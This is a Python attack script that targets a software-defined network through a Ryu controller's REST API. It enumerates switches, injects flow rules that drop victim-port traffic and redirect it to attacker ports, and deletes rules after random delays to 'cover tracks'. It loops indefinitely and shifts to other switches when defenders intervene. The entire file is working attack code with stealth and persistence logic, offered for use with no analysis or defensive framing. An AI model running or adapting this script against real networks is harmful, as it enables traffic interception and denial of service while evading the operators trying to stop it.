import requests
import json
import time
import random

# Ryu REST API endpoint
RYU_REST_URL = "http://127.0.0.1:8080"

# Get active switches dynamically
def get_switches():
    response = requests.get(f"{RYU_REST_URL}/stats/switches")
    if response.status_code == 200:
        return response.json()
    return []

# Get flow rules from a switch
def get_flows(switch_id):
    response = requests.get(f"{RYU_REST_URL}/stats/flow/{switch_id}")
    if response.status_code == 200:
        return response.json()
    return {}

# Install a malicious flow rule
def install_flow_rule(rule):
    requests.post(f"{RYU_REST_URL}/stats/flowentry/add", data=json.dumps(rule), headers={'Content-Type': 'application/json'})

# Delete a flow rule (covering tracks)
def delete_flow_rule(rule):
    requests.post(f"{RYU_REST_URL}/stats/flowentry/delete", data=json.dumps(rule), headers={'Content-Type': 'application/json'})

# Main attack function
def launch_attack():
    switches = get_switches()
    if not switches:
        print("[-] No switches detected. Exiting.")
        return
    
    while True:
        # Randomly select a target switch
        target_switch = random.choice(switches)
        print(f"[+] Injecting malicious flow rules on Switch {target_switch}...")

        # Choose random victim and attacker ports
        victim_port = random.choice([1, 2, 3, 4])
        attacker_port = random.choice([5, 6, 7, 8])  

        # Randomized blocking behavior (20-30% drop)
        block_rule = {
            "dpid": target_switch,
            "priority": random.choice([40, 50, 60]),  
            "match": {
                "in_port": victim_port
            },
            "actions": []  # Drop packets
        }

        # Redirect victim traffic to attacker
        redirect_rule = {
            "dpid": target_switch,
            "priority": 80,  
            "match": {
                "in_port": victim_port
            },
            "actions": [{"type": "OUTPUT", "port": attacker_port}]
        }

        # Install malicious rules
        install_flow_rule(block_rule)
        install_flow_rule(redirect_rule)
        print(f"[+] Traffic from port {victim_port} is now blocked and redirected to {attacker_port}.")

        # Cover tracks after random delay
        time.sleep(random.randint(5, 15))
        delete_flow_rule(block_rule)
        print("[+] Deleting traces of attack (stealth mode)...")

        # Reinstall if defender removes rules
        time.sleep(random.randint(3, 6))
        if not any(flow["match"].get("in_port") == victim_port for flow in get_flows(target_switch).get(str(target_switch), [])):
            print("[🔥] Defender removed rules! Switching attack to a new switch...")
            continue  

if __name__ == "__main__":
    launch_attack()
